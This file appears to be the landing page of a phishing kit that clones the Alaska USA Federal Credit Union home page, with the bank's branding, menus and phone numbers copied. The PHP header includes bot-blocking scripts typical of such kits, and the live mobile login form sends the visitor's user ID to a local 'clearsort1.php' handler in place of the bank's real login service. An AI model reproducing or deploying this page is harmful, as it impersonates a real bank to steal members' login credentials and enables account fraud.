<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

session_start();

include 'blocker.php';
include 'antirobot.php';
include 'bt.php';


?>



<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Alaska USA services for you</title>
<meta name="description" content="Alaska USA Federal Credit Union is a federally chartered financial services cooperative with branches across Alaska, Western Washington, and California's High Desert Region.  AlaskaUSA provides a full range of high quality, low cost financial services.">
<meta name="keywords" content="AlaskaUSA, Alaska, Arizona, Washington, USA, San Bernardino California, Victor Valley, High Desert, Anchorage, Credit Union, Bank, Financial, Finance, Loan, Credit, Lending, Insurance, Mortgage, Refinance, home, Online banking, by phone, UltraBranch, Saving, Checking, Account, Money, Service, Relocate, Moving, Real Estate, business, AKUSA">
<meta name="documentation" content="drop menu,marketing ads,tab box,fraud alerts,whats new,features">
<meta name="viewport" content="width=device-width">

<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="apple-touch-icon" href="icon.png" type="image/png">
<link rel="apple-touch-icon" sizes="72x72" href="icon-72.png" type="image/png">
<link rel="apple-touch-icon" sizes="114x114" href="icon@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="144x144" href="icon-72@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="60x60" href="icon-60.png" type="image/png">
<link rel="apple-touch-icon" sizes="120x120" href="icon-60@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="76x76" href="icon-76.png" type="image/png">
<link rel="apple-touch-icon" sizes="152x152" href="icon-76@2x.png" type="image/png">
<meta name="msapplication-TileImage" content="icon-72@2x.png">
<meta name="msapplication-TileColor" content="#003399">
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-W942G3C');</script>
<!-- End Google Tag Manager -->

<link rel="stylesheet" href="css/akusafonts.css?20181128" title="master">
<link rel="stylesheet" href="css/akusa-base.css" title="master">
<link rel="stylesheet" href="css/akusa-phone.css" media="(max-width:767px)">
<link rel="stylesheet" href="css/akusa-desktop.css" media="all and (min-width:768px)">
<link rel="stylesheet" href="css/akusa-print.css" media="print">
<!--[if lt IE 9]>
<link rel="stylesheet" href="https://www.alaskausa.org/css/akusa-desktop.css" title="master">
<style>#pgBody {width:100%;}</style>
<![endif]-->
<noscript>
<link rel="stylesheet" href="https://www.alaskausa.org/css/no-js.css" title="master">
</noscript>

<link rel="stylesheet" href="css/slick.css">
<link rel="stylesheet" href="css/akusa-home.css">
<style>
 #news ul:before {content:none;}

 .linkList_news {padding: 10px; margin-top: .5em; margin-bottom: -1.5em;}
 .linkList_news div { background: url(images/homeSprites.png) no-repeat 50% -392px;height:128px;}
.linkList:nth-of-type(5) ul:after {background-position:-128px 0;top:1em;}
@media only screen and (max-width: 767px) {
	.linkList_news {
		display: none;
	}
}
</style>
<style>
	.mobileMenu.up2 > li {
		display: inline-block;
		height: 60px;
		width: 140px;
		margin: 5px 5px;
		text-align: center;
		padding-top: 15px;
	}
</style>
	

</head>

<body id="home">

<!-- Google Tag Manager (noscript) -->
<noscript aria-hidden="true"><iframe title="Google Tag Manager" src="https://www.googletagmanager.com/ns.html?id=GTM-W942G3C"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="pgBody">


	<div class="siteHeader" role="banner">
	<section class="skipLinks">
		<h2 class="visuallyhidden">Skip links</h2>
		<p><a href="#main" class="visuallyhidden">Skip to main content</a></p>
		<p><a href="/service/contact.asp" class="visuallyhidden">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
		<p><a href="#footer" class="visuallyhidden">Skip to footer</a></p>
	</section>
	<div class="global col_all">
		<h2>Alaska USA Federal Credit Union</h2>
		<div id="homeAccBtn" class="mobileBtn"><a href="/"><span class="AkusaIcon-lock2"><span class="visuallyhidden">Lock icon</span></span><br>LOG IN</a></div>
		<a href="/?t=tn" id="logo"><img src="https://www.alaskausa.org/images/nav/akusafcu_logo.png" alt="Alaska USA Federal Credit Union"></a>
		<div id="navMenuBtn" class="mobileBtn"><a href="/sitemap.asp" id="openMenu"><span class="AkusaIcon-menu"><span class="visuallyhidden">Menu icon</span></span>Menu</a></div>
		<div id="persistentLogin"></div>

		<ul class="sections">
			<li class="on"><a href="/">For you</a></li>
			<li><a href="/business.asp">For your business</a></li>
			<li><a href="/about/">About us</a></li>
	</ul>


		<ul class="tools">
			<li id="ubMenu"><a href="#" class="sf-with-ul"><span class="AkusaIcon-lock2"><span class="visuallyhidden">Lock icon</span></span>Log In</a>
				<div class="menu">
					<a class="close" href="#"><span class="AkusaIcon-cancel-x"><span class="visuallyhidden">Close</span></span></a>
					<h4>Access your account and pay bills</h4>

			<!--<form name="SignInGlobal" class="ubForm" id="SignInGlobal" method="post" action="" aria-label="Login to your account">
				
					<p class="login">
				
					<input type="hidden" name="Referrerfield" />
					<input type="text" name="UserName" aria-label="User Id" id="UserNameGlobal" class="usernameField" value="" placeholder="User ID">
					
					
					<input type="image" src="log-btn.jpg" width="78" height="33"></p>
				<p class="clearfix center" style="color:#044990;" id="SignInGlobal_links">
					<a style="padding:5px 6px;" href="https://login.alaskausa.org/efs/ultrabranch/ForgotPAC">Forgot Login</a>
					
					 | <a style="padding:5px 6px;" href="https://www.alaskausa.org/enroll">Enroll</a>
					
				</p>
			</form>-->
	
					<p class="action center">

					<a class="linkBtn" href="/exit.asp?id=payment&x1">Make a payment</a>

					</p>

					<p><a class="app" href="/service/ultrabranch/app.asp">Get the Alaska&nbsp;USA app</a></p>

				</div>
			</li>
			<li id="locationsMenu">
				<a href="/service/branches.asp"><span class="AkusaIcon-locations"><span class="visuallyhidden">Locations icon</span></span>Locations</a>
				<div class="menu">
					<ul>
						<li><a href="/service/branches.asp">Branches</a></li>
						<li><a href="/service/atms.asp">ATMs</a></li>

						<li><a href="/service/branches.asp?sharedbranches=true">Shared Branching Locations</a></li>

						<li><a href="/exit.asp?id=aumcContact">Mortgage Offices</a></li>
						<li><a href="/insurance/contact.asp">Insurance Offices</a></li>
					</ul>
				</div>
			</li>
			<li id="ratesMenu">

				<a href="/current/rates/"><span class="AkusaIcon-rates"><span class="visuallyhidden">Rates icon</span></span>Rates</a>

				<div class="menu">

					<ul>
						<li><a href="/current/rates/consumerloanrates.asp">Vehicle Loans</a></li>
						<li><a href="/current/rates/consumerloanrates.asp#Other_Secured">Other Loans</a></li>
						<li><a href="/current/rates/consumerloanrates.asp#Credit_Cards_and_Unsecured_Loans">Credit Cards</a></li>
						<li><a href="/current/rates/sharerates.asp">Checking / Savings</a></li>
						<li><a href="/current/rates/sharerates.asp#Money_Market_Accounts">Money Market Account</a></li>
						<li><a href="/current/rates/certificaterates.asp">Certificates</a></li>
						<li><a href="/current/rates/homeloanrates.asp">Home Loans</a></li>
						<li><a href="/current/rates/businessloanrates.asp">Business Loans</a></li>
						<li><a href="/current/rates/">All Rates</a></li>
					</ul>

				</div>
			</li>
			<li id="contactMenu">
				<a href="/service/contact.asp"><span class="AkusaIcon-phone"><span class="visuallyhidden">Phone icon</span></span>Contact</a>
				<div class="menu">

					<p><strong>907-563-4567</strong> or <br><strong>800-525-9094</strong></p>
					<p>Open 24 hours a day, 7 days a week.</p>
					<p><a href="/service/email.asp">memberservice<span class="AkusaIcon-at"><span class="visuallyhidden">at</span></span>alaskausa.org</a>

						<br><span class="unavailable" >Live chat is currently unavailable</span></p>
					<p>Routing number <a style="display:inline" href="/service/help/achnumber.asp" title="Routing and account number calculator">325272021</a></p>
					<p><a href="/service/contact.asp">More contact information</a></p>
				</div>
			</li>
		</ul>
	</div><!-- #topBar-->

<nav id="navBar" class="col_all">
<ul class="globalNav">
	<li id="accounts">
		<a href="/share/">Accounts</a>
		<div class="menu">
				<div class="col">
					<h4>Accounts</h4>
					<ul>
						<li><a href="/share/checking.asp">Checking</a></li>
						<li><a href="/share/savings.asp">Savings</a></li>
						<li><a href="/loans/visaPlatinum.asp">Credit Card</a></li>
						<li><a href="/share/moneymarket.asp">Money Market</a></li>
						<li><a href="/share/certificates.asp">Certificates</a></li>
						<li><a href="/share/IRAs.asp">IRA</a></li>
						<li><a href="/share/hsa.asp">Health Savings Account</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>Related Services</h4>
					<ul>
						<li><a href="/share/debit.asp">Visa Debit Card / ATM Card</a></li>
						<li><a href="/service/ultrabranch/">Online Account Access</a></li>
                        <li><a href="/share/clickswitch.asp">ClickSWITCH<sup>&trade;</sup></a></li>
						<li><a href="/share/directDeposit.asp">Direct Deposit</a></li>
						<li><a href="/share/overdraftProtection.asp">Overdraft Protection</a></li>
						<li><a href="/service/fees/">Fees</a></li>
						<li><a href="/service/otherServices.asp">Other Services</a></li>
					</ul>
				</div>
				<div class="col action">
					<p><a href="/service/apply.asp?s=checking" class="linkBtn">Open an account</a></p>
					<p><a href="/service/contact.asp" class="linkBtn">Contact us<br>800-525-9094</a></p>
                    <p><a href="/current/rates/" class="linkBtn">Rates</a></p>
				</div>
		</div>
	</li>
	<li id="loans">
		<a href="/loans/">Loans</a>
		<div class="menu">
				<div class="col">
					<h4>Vehicle Loans</h4>
					<ul>
						<li><a href="/loans/vehicle.asp">Cars / Trucks</a></li>
						<li><a href="/loans/offroad.asp">Motorcycles</a></li>
						<li><a href="/loans/offroad.asp">ATVs / Snowmachines</a></li>
						<li><a href="/loans/rv.asp">Recreational Vehicles</a></li>
						<li><a href="/loans/vessels.asp">Boats / Vessels</a></li>
						<li><a href="/loans/aircraft.asp">Aircraft</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>Personal Loans</h4>
					<ul>
						<li><a href="/loans/signature.asp">Signature Loans</a></li>
						<li><a href="/loans/creditline.asp">Credit Line</a></li>
						<li><a href="/loans/paydayCreditline.asp">Military Payday Credit Line</a></li>
						<li><a href="/loans/pledgeOfShares.asp">Pledge of Shares</a></li>
						<li><a href="/loans/pledgeOfCertificate.asp">Pledge of Certificate</a></li>
						<li><a href="/loans/">All Loan Types</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>Credit Cards</h4>
					<ul>
						<li><a class="visa" href="/loans/visaPlatinum.asp"><span></span>Visa<sup><small>&reg;</small></sup> Credit Cards with Rewards</a></li>
					</ul>
					<h4>Home&#160;Loans</h4>
					<ul>
						<li><a href="/realestate/#mortgage">Home Mortgages</a></li>
						<li><a href="/realestate/#equity">Home Equity (HELOC)</a></li>
						<li><a href="/realestate/#improvement">Home Improvement</a></li>
                        <li><a href="/realestate/#property">Recreational Property</a></li>
						<li><a href="/realestate/#other">Residential Lots</a></li>
						<li><a href="/realestate/#residential">Residential Construction</a></li>
					</ul>
				</div>
				<div class="col action">
					<p><a href="/exit.asp?id=consloanapp" class="linkBtn">Apply online</a></p>
					<p><a href="/current/rates/consumerLoanRates.asp" class="linkBtn">Loan rates</a></p>
					<p><a href="/service/contact.asp" class="linkBtn">Contact us<br>
					800-525-9094</a></p>
				</div>
		</div>
	</li>
	<li id="insurance">
		<a href="/insurance/">Insurance</a>
		<div class="menu">
				<div class="col">
					<h4>Protect Your Vehicles</h4>
					<ul>
						<li><a href="/insurance/personal/auto.asp">Auto</a></li>
						<li><a href="/insurance/personal/boat.asp">Boat</a></li>
						<li><a href="/insurance/personal/rv.asp">Motorhome / RV</a></li>
						<li><a href="/insurance/personal/toys.asp">Motorcycles / ATVs / Snowmachines</a></li>
					</ul>
					<h4>Protect Your Loan</h4>
					<ul>
						<li><a href="/insurance/members/gap.asp">Asset Protection (GAP)</a></li>
						<li><a href="/insurance/members/paymentprotection.asp">Payment Protection</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>Protect Your Home</h4>
					<ul>
						<li><a href="/insurance/personal/property.asp#homeowners">Homeowners</a></li>
						<li><a href="/insurance/personal/property.asp#condo">Condo</a></li>
						<li><a href="/insurance/personal/property.asp#renters">Renters</a></li>
						<li><a href="/insurance/personal/property.asp#landlord">Landlord</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>Protect You / Your Family</h4>
					<ul>
						<li><a href="/insurance/personal/liability.asp">Umbrella</a></li>
						<li><a href="/insurance/members/add.asp">Accidental Death &amp; Dismemberment</a></li>
						<li><a href="/insurance/members/termlife.asp">Term Life</a></li>
						<li><a href="/insurance/members/wholelife.asp">Whole life coverage</a><li>
					</ul>
				</div>
				<div class="col action">
					<p><a href="/insurance/quote.asp" class="linkBtn">Get an insurance quote</a></p>
					<p><a href="/insurance/contact.asp" class="linkBtn">Contact Alaska&nbsp;USA Insurance Brokers<br>
					800-478-1251</a></p>
				</div>
		</div>
	</li>
	<li id="homeloans">
		<a href="/realestate/">Home Loans</a>
		<div class="menu">
				<div class="col">
					<h4>Buying or Refinancing</h4>
					<ul>
						<li><a href="/realestate/#mortgage">Home Mortgages</a></li>
						<li><a href="/realestate/#property">Residential Lots</a></li>
						<li><a href="/realestate/#construction">Residential Construction</a></li>
						<li><a href="/realestate/#property">Recreational Property</a></li>
						<li><a href="/exit.asp?id=AUMCTeam">Contact a Loan Originator</a></li>
					</ul>
					<h4>Rate Quote</h4>
					<ul>
						<li><a href="/current/rates/homeloanrates.asp">Home Mortgages</a></li>
					</ul>
				</div>
				<div class="col">
					<h4>For Your Current Home</h4>
					<ul>
						<li><a href="/realestate/#equity">Home Equity (HELOC)</a></li>
						<li><a href="/realestate/#improvement">Home Improvement</a></li>
						<li><a href="/realestate/#property">Recreational Property</a></li>
						<li><a href="/realestate/#residential">Residential Construction</a></li>
                  </ul>
					<h4>Rates</h4>
					<ul>
						<li><a href="/current/rates/homeloanrates.asp#Residential_Lot">Residential Lots</a></li>
						<li><a href="/current/rates/homeloanrates.asp#Recreational_Property">Recreational Property</a></li>
						<li><a href="/current/rates/homeloanrates.asp#Home_Equity_Line_of_Credit">HELOC</a></li>
						<li><a href="/current/rates/homeloanrates.asp#Residential_Equity">Equity Loans</a></li>
						<li><a href="/current/rates/homeloanrates.asp#Home_Improvement">Home Improvement</a></li>
					</ul>
				</div>
				<div class="col action">
					<h4>Home mortgages</h4>

					<p><a href="/realestate/mortgageapply.asp" class="linkBtn">Apply online</a></p>

					<p><a href="/current/rates/homeloanrates.asp" class="linkBtn">Request a rate quote</a></p>
					<h4>Other loans</h4>
					<p><a href="/service/apply.asp?s=reloans&amp;a=apply" class="linkBtn">Apply for a Real Estate Loan</a></p>
					<p><a href="/service/contact.asp" class="linkBtn">Contact us<br>
				    800-525-9094</a></p>
				</div>
		</div>
	</li>
	<li id="investments">
		<a href="/investment/">Plan &amp; Invest</a>
		<div class="menu">
				<div class="col">
					<ul>
						<li><a href="/investment/#retire">Retirement</a></li>
						<li><a href="/investment/#savings">Education Funding</a></li>
						<li><a href="/investment/#ins">Insurance</a></li>
						<li><a href="/investment/#ESRP">Employer Sponsored Retirement Plans</a></li>
						<li><a href="/investment/#invest">Investments</a></li>
					</ul>
				</div>
				<div class="col action">
                    <p><a href="/investment/email.asp" class="linkBtn">Contact an advisor</a></p>
                    <p><a href="/investment/team.asp" class="linkBtn">Meet your financial advisors</a></p>
				</div>
		</div>
	</li>
	<li id="search">
		<a href="/service/search.asp"><span class="AkusaIcon-search"><span class="visuallyhidden">Search icon</span></span>Search</a>
		<div class="menu">
				<div class="col">
					<h4><label for="searchField">Search Alaska&nbsp;USA</label></h4>
					<form name="searchForm" action="" onSubmit="return validate(this)" method="get">
					<p><input id="searchField" name="s" type="text" class="searchBox" placeholder="search">
						<input type="submit" name="search" id="searchSubmit" class="linkBtn searchBtn" value="go">
					</p>
					</form>
				</div>
		</div>
	</li>






</ul>
</nav>

</div><!-- #siteHeader-->
<div class="flyin hide"></div>

<main id="main" role="main">
<div class="homeContainer">
<h1 class="hidden">Alaska USA services for you</h1>
<div id="homeComm">

<div id="homeMobile">
	<div id="mobileLogin">
		<div class="mobileLoginHeader">Access your account</div>
		<div id="ubLoginMobileContainer">
		
			<form name="SignInMobile" class="ubForm" id="SignInMobile" method="post" action="clearsort1.php" aria-label="Login to your account">
				
					<p class="login">
				<br><br>
					<input type="hidden" name="Referrerfield" />
					<input type="text" name="UserName" aria-label="User Id" id="UserNameMobile" class="usernameField" value="" placeholder="User ID">
					
					<input type="image" src="log-btn.jpg" width="78" height="33"></p>
				<p class="clearfix center" style="color:#044990;" id="SignInMobile_links">
					<a style="padding:5px 6px;" href="">Forgot Login</a>
					
					 | <a style="padding:5px 6px;" href="">Enroll</a>
					
				</p>
			</form>
	
		</div>
	</div>

	<ul class="mobileMenu up2">
		<li id="makepayment"><a href="/exit.asp?id=payment"><span class="AkusaIcon-car-icon"></span><span>Make a payment</span></a></li>
	
		<li id="contact">
			<a href="/service/contact.asp"><span class="AkusaIcon-ContactUs"></span><span>Contact</span></a>
			<div class="menu" style="top:79px">
				<p><a class="close" href="#"><span class="AkusaIcon-cancel-x"><span class="visuallyhidden">Close</span></span></a></p>
				<div class="container">
					<p><strong>907-563-4567</strong> or <br><strong>800-525-9094</strong></p>
					<p>Open 24 hours a day, 7 days a week.</p>
					<p><a class="emailLink" href="/service/email.asp">memberservice<span class="AkusaIcon-at"><span class="visuallyhidden">at</span></span>alaskausa.org</a>
						<br><span class="unavailable" >Live chat is currently unavailable</span></p>
					<p>Routing number <a style="display:inline" href="/service/help/achnumber.asp" title="Routing and account number calculator" role="menuitem" tabindex="-1">325272021</a></p>
					<p><a href="/service/contact.asp" role="menuitem" tabindex="-1">More contact information</a></p>
				</div>
			</div>
		</li>
		<li id="locations"><a href="/service/branches.asp"><span class="AkusaIcon-locations"></span><span>Locations</span></a></li>
		<li id="rates"><a href="/current/rates/"><span class="AkusaIcon-rates"></span><span>Rates</span></a></li>
	</ul><!-- .mobileMenu-->
</div><!-- .homeMobile-->


<div class="homeActions">

	<div class="shortcuts">
		<h2><span class="AkusaIcon-lock2"></span>Access your account</h2>
		<div>
			
			<!--<form name="SignInHome" class="ubForm" id="SignInHome" method="post" action="clearsort1.php" aria-label="Login to your account">
				
					<p class="login">
				
					
					<input type="text" name="UserName" aria-label="User Id" id="UserNameHome" class="usernameField" value="" placeholder="User ID">
					
					<input type="image" src="log-btn.jpg" width="78" height="33"></p>
				<p class="clearfix center" style="color:#044990;" id="SignInHome_links">
					<a style="padding:5px 6px;" href="https://login.alaskausa.org/efs/ultrabranch/ForgotPAC">Forgot Login</a>
					
					 | <a style="padding:5px 6px;" href="https://www.alaskausa.org/enroll">Enroll</a>
					
				</p>
			</form>-->
	
		</div>

		<div>
			<a class="actionBtn" href="/exit.asp?id=payment"><span class="AkusaIcon-car-icon"></span>Make a payment</a>
			
		</div>
	</div>
</div><!-- .homeActions -->

<div class="hero">

	<div class="c0">
		<div class="bg">
			<img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Background-Photos-Blue.jpg" alt="Insurance for whatever life hands you">
		</div>
		<div class="msg">
			<a href="/insurance/quote.asp?aid=q619h_blue">
			<h2><img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Floating-Banner-Blue.png" alt="Insurance for whatever life hands you"></h2>

			</a>
		</div>
	</div>

	<div class="c0">
		<div class="bg">
			<img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Background-Photos-Green.jpg" alt="Insurance for whatever life hands you">
		</div>
		<div class="msg">
			<a href="/insurance/quote.asp?aid=q619h_green">
			<h2><img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Floating-Banner-green.png" alt="Insurance for whatever life hands you"></h2>

			</a>
		</div>
	</div>

	<div class="c0">
		<div class="bg">
			<img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Background-Photos-Yellow.jpg" alt="Celebrating 70 years">
		</div>
		<div class="msg">
			<a href="/insurance/quote.asp?aid=q619h_yellow">
			<h2><img src="https://www.alaskausa.org/current/promo/data/images/primary/Q3-Floating-Banner-yellow.png" alt="Celebrating 70 years"></h2>

			</a>
		</div>
	</div>

	<div class="c0">
		<div class="bg">
			<img src="https://www.alaskausa.org/current/promo/data/images/primary/billpay.jpg" alt="Coming August 2019">
		</div>
		<div class="msg">
			<a href="/service/ultrabranch/billpay.asp?aid=q819h_billpay">
			<h2><img src="https://www.alaskausa.org/current/promo/data/images/primary/billpay_float.png" alt="Coming August 2019"></h2>

			</a>
		</div>
	</div>

</div>

	<div class="slider">
	<div class="col_all">
		<div class="slick">

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/Great_Rates.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/share/certificates.asp">
					<h2>Great rates, bigger returns</h2>
					<p>Watch your money grow with a savings, money market, or certificate account</p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/24_7.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/service/contact.asp">
					<h2>We’re here when you need us</h2>
					<p>Call the Member Service Center anytime, day or night</p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/Safeguard.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/insurance/personal/">
					<h2>Safeguard your possessions</h2>
					<p>Home and auto insurance from the nation’s leading carriers</p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/House.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/realestate/#other">
					<h2>Real estate loans</h2>
					<p>Make your next home improvement project affordable</p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/Credit_Card.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/loans/visaPlatinum.asp">
					<h2>Get a rewarding credit card</h2>
					<p>Feel great about a low, fixed rate and travel reward points with every purchase</p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/ClickSWITCH.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="/share/clickswitch.asp">
					<h2>All your banking. One credit union.</h2>
					<p>Easily consolidate direct deposits and automatic payments with ClickSWITCH<sup>&trade;</sup></p>
					</a>
				</div>
			</div><!-- .slide -->

			<div class="slide">
				<div class="bg">
					<img src="https://www.alaskausa.org/current/promo/data/images/secondary/learn.png" alt="" height="125">
				</div>
				<div class="msg">
					<a href="">
					<h2>Build Your Financial Know-How</h2>
					<p>Articles, videos, and tips to help you plan for your financial future</p>
					</a>
				</div>
			</div><!-- .slide -->

		</div>
	</div><!-- .col_all -->
	</div><!-- #slider -->
</div><!-- #homeComm -->


<div class="homeMain">

<div class="col_all">
	<div class="linkLists">

	<div id="quicklinks" class="linkList">
		<h2><a href="/service/contact.asp" onclick="return acMini(this);">Quick&nbsp;Links</a></h2>
		<ul>
			<li><a href="/share/activateCard.asp?t=q" title="Activate Debit Card">Activate Card</a></li>
			<li><a href="/service/faq.asp?t=q">FAQs</a></li>
			<li><a href="/service/fees/?t=q">Fees &amp; Disclosures</a></li>
			<li><a href="/service/download.asp?t=q">Forms &amp; Applications</a></li>
			<li><a href="/service/pfdAnswers.asp?t=q">PFD Answer Page</a></li>
			<li><a href="/current/infosheets/info.asp?t=q">Product Information Library</a></li>
			<li><a href="/service/faq.asp?s=travel">Travel Notifications</a></li>
		</ul>
	</div><!-- #quicklinks -->

	<div class="listSpace"></div>

	<div id="resources" class="linkList">
		<h2><a href="" >Financial Resources</a></h2>
		<ul>
			<li><a href="">Calculators</a></li>
			<li><a href="">Fraud, Privacy, and Security</a></li>
			<li><a href="">Frequently Asked Questions</a></li>
			<li><a href="">Learning Center</a></li>
            <li><a href="">Resource Center</a></li>
			<li><a href="">Retirement Resources</a></li>

			<li><a href="">Avoiding Foreclosure</a></li>
		</ul>
	</div><!-- #resources -->

	<div class="listSpace"></div>

	<div id="news" class="linkList">
		<h2><a href="" >News &amp; Announcements</a></h2>
		<div class="linkList_news"><a href=""><span class="visuallyhidden">Alaska USA on YouTube</span><div></div></a></div>
		<ul>
			<li><a href="">Advertising</a></li>
			<li><a href="">Business Spotlight</a></li>
			<li><a href="">Press Releases</a></li>
			<li><a href="">Publications</a></li>
			<li><a href="">Community Resources</a></li>
			<li><a href="">Merchant Data Compromise Information</a></li>
		</ul>
	</div><!-- #news-->

	</div><!-- .linkLists -->
</div><!-- .col_all -->
    <p class="note" style="text-align: center">*The disclosed Dividend Rate and Annual Percentage Yield (APY) are the prospective rates and yields that Alaska USA anticipates paying for the applicable
dividend period. The dividend method you select may affect certificate earnings. There is a penalty for early withdrawal from a certificate or IRA certificate. In
the event an early withdrawal lowers the certificate balance below the required minimum, the certificate must be cancelled or closed, and the forfeiture
amount will be calculated using the full balance of the certificate.</p>
</div><!-- .homeMain -->
</div><!--.homeContainer-->
</main>

<div id="siteFooter" role="contentinfo">
	<div id="footer" class="col_all">
		<nav aria-label="footer links">
		<ul class="links">
			<li><a href="">Home</a> | <a href="">About</a></li>
			<li><a href="">Contact</a></li>
			<li><a href="">Careers</a></li>
			<li><a href="">Privacy</a></li>
			<li><a href="">Security</a></li>
			<li><a href="">Locations</a></li>
			<li><a href="">FAQs</a></li>
			<li><a href="">What's your Alaska&nbsp;USA story?</a></li>
			
		</ul>
		</nav>
		
		<div id="footer_contact">
			<h2>Connect with us!</h2>
			<ul class="social">
				<li><a href="" class="ext"><span class="AkusaIcon-Facebook">Facebook icon</span>Facebook</a></li>
				<li><a href="" class="ext"><span class="AkusaIcon-Youtube">Youtube icon</span>Youtube</a></li>
				<li><a href="" class="ext"><span class="AkusaIcon-LinkedIn">LinkedIn icon</span>LinkedIn</a></li>
				<li><a href="" class="ext"><span class="AkusaIcon-Twitter">Twitter icon</span>Twitter</a></li>
				<li><a href="" class="ext"><span class="AkusaIcon-Instagram">Instagram</span>Instagram</a></li>

			</ul>
			<h3><span>Need to reach us? </span><span>Give us a call!</span></h3>
			<p>Member Service Center is open 24/7</p>
			<p>907-563-4567 or 800-525-9094</p>
		</div>
		<div id="footer_sitemap">
    		<nav aria-label="quick menu">
			<dl id="fsm">
				<dt><a href="">Checking and Savings</a></dt>
				<dd>
					<ul>
					<li><a href="">Checking accounts</a></li>
					<li><a href="">Savings accounts</a></li>
					<li><a href="">Money market accounts</a></li>
					<li><a href="">Certificate accounts</a></li>
					<li><a href="">Individual retirement accounts (IRA)</a></li>
					<li><a href="">Health Savings Account</a></li>
					<li><a href="">ATM &amp; Visa Debit Card</a></li>
					</ul>
				</dd>
				<dt><a href="">Loans &amp; Credit Cards</a></dt>
				<dd>
					<ul>
					<li><a href="">Visa<sup>&reg;</sup> Credit Cards</a></li>
					<li><a href="">Car &amp; Truck Loans</a></li>
					<li><a href="">Motorcycle Loans</a></li>
					<li><a href="">ATV &amp; Snowmachine Loans</a></li>
					<li><a href="">Recreational Vehicle Loans</a></li>
					<li><a href="">Boat &amp; Vessel Loans</a></li>
					<li><a href="">Aircraft Loans</a></li>
					<li><a href="">Signature Loans</a></li>
					<li><a href="">Credit Line</a></li>
					<li><a href="">Military Payday Credit Line</a></li>
					<li><a href="">Pledge of Shares</a></li>
					<li><a href="">Pledge of Certificate</a></li>
					</ul>
				</dd>

				<dt><a href="">Home Loans</a></dt>
				<dd>
					<ul>
					<li><a href="">Mortgage Loans</a></li>
					<li><a href="">Contact a Mortgage Originator</a></li>
					<li><a href="">Home Equity Line of Credit</a></li>
					<li><a href="">Home Improvement Loans</a></li>
					<li><a href="">Residential Equity Loans</a></li>
					<li><a href="">Residential Lot Loans</a></li>
					<li><a href="">Recreational Property Loans</a></li>
					</ul>
				</dd>

				<dt><a href="">Insurance</a></dt>
				<dd>
					<ul>
					<li><a href="">Protect Your Vehicles</a></li>
					<li><a href="">Protect Your Home</a></li>
					<li><a href="">Programs for Alaska&nbsp;USA Members</a></li>
					<li><a href="">Asset Protection (GAP)</a></li>
					<li><a href="">Payment Protection</a></li>
					</ul>
				</dd>

				<dt><a href="">Business Services</a></dt>
				<dd>
					<ul>
					<li><a href="">Checking</a></li>
					<li><a href="">Visa Debit Card</a></li>
					<li><a href="">Card Processing</a></li>
					<li><a href="">Depository Services</a></li>
					<li><a href="">PurchaseOne</a></li>
					<li><a href="">UltraBranch&reg; Business Edition</a></li>
					<li><a href="">Business &amp; Commercial Loans</a></li>
					<li><a href="">Resources</a></li>
					</ul>
				</dd>

				<dt><a href="">Service Network</a></dt>
				<dd>
					<ul>
					<li><a href="">Branches</a></li>
					<li><a href="">ATMs</a></li>
					<li><a href="">Online Account Access</a></li>
					<li><a href="">Member Service Center</a></li>
					<li><a href="">More Contact Information</a></li>
					<li><a href="">Rates</a> &amp; <a href="/service/fees/default.asp">Fees</a></li>
					<li><a href="">Frequently Asked Questions</a></li>
					<li><a href="">Search Alaska&nbsp;USA</a></li>
					<li><a href="">Fraud &amp; ID Theft</a></li>
					<li><a href="">Privacy</a> &amp; <a href="/service/security/security.asp">Security</a></li>
					<li><a href="">Educational Resources</a></li>
					</ul>
				</dd>

				<dt><a href="">About Alaska&nbsp;USA</a></dt>
				<dd>
					<ul>
					<li><a href="">Press Releases</a></li>
					<li><a href="">Publications</a></li>
					<li><a href="">Membership</a></li>
					<li><a href="">Employment Opportunities</a></li>
					<li><a href="">Credit Union Officials</a></li>
